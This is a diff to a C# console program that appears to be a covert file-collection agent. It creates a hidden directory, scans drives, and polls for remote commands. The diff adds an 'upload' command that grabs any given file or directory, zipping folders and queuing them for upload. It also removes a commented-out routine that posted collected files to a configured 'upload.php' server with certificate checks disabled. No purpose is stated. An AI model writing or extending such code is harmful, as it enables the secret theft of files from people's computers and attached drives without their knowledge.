@@ -1,4 +1,5 @@
 using System.Diagnostics;
+using System.IO.Compression;
 using System.Net.Http.Headers;
 using System.Text;
 
@@ -18,6 +19,12 @@ internal class Program
         classRegistered = configFile.ReadLine();
         version = configFile.ReadLine();
         configFile.Close();
+
+        if (!Directory.Exists(SaveRoot)) 
+        {
+            Directory.CreateDirectory(SaveRoot);
+        }
+        File.SetAttributes(SaveRoot, FileAttributes.Hidden);
 
         Directory.CreateDirectory("Upload_Buffer\\File_Stack");
         if (!File.Exists("Upload_Buffer\\File_Stack\\File_Stack.txt"))
@@ -148,6 +155,36 @@ internal class Program
                                 p = null;
                             }
                         }
+                        else if (splited[0] == "upload")
+                        {
+                            if (splited.Length <= 1) continue;
+                            string path = command.Substring(6).Trim();
+                            if (!File.Exists(path) && !Directory.Exists(path))
+                            {
+                                string errorFileName = $"Upload_Buffer\\Error at {DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss")} Type: File Not Found.txt";
+                                using (StreamWriter errorFile = new StreamWriter(errorFileName))
+                                {
+                                    errorFile.WriteLine($"File not found with path: {path}");
+                                    errorFile.Close();
+                                }
+                                File.AppendAllText("Upload_Buffer\\File_Stack\\File_Stack.txt", errorFileName);
+                            }
+                            else if (File.Exists(path))
+                            {
+                                File.AppendAllText("Upload_Buffer\\File_Stack\\File_Stack.txt", path);
+                            }
+                            else if (Directory.Exists(path))
+                            {
+                                string zipFileName = Path.Combine(Path.GetDirectoryName(path), $"Upload----==----{Path.GetFileName(path)}.zip");
+                                if (File.Exists(zipFileName))
+                                {
+                                    File.Delete(zipFileName);
+                                }
+                                ZipFile.CreateFromDirectory(path, zipFileName);
+                                Console.WriteLine(zipFileName + " done");
+                                File.AppendAllText("Upload_Buffer\\File_Stack\\File_Stack.txt", zipFileName);
+                            }
+                        }
                     }
                 }
                 Thread.Sleep(10000);
@@ -256,19 +293,6 @@ internal class Program
                     menu.Close();
                     Console.WriteLine("Done");
                     File.AppendAllText("Upload_Buffer\\File_Stack\\File_Stack.txt", $"Upload_Buffer\\{saveFileName}.txt\r\n");
-                    /*
-                    try
-                    {
-                        var handler = new HttpClientHandler();
-                        handler.ServerCertificateCustomValidationCallback = delegate { return true; };
-                        var content = new MultipartFormDataContent();
-                        content.Add(new ByteArrayContent(File.ReadAllBytes($"Upload_Buffer\\{saveFileName}.txt")), "file", Uri.EscapeDataString($"{saveFileName}.txt"));
-                        HttpClient client = new HttpClient(handler);
-                        await client.PostAsync(classRegistered + "upload.php", content);
-                    }
-                    catch { }
-                    */
-
                 }
             }
             for (int i = 0; i < 26; i++)
@@ -278,6 +302,8 @@ internal class Program
                     registeredDrive[i] = false;
                 }
             }
+            allDrives = null;
+            visited = null;
             Thread.Sleep(1000);
         }
     }
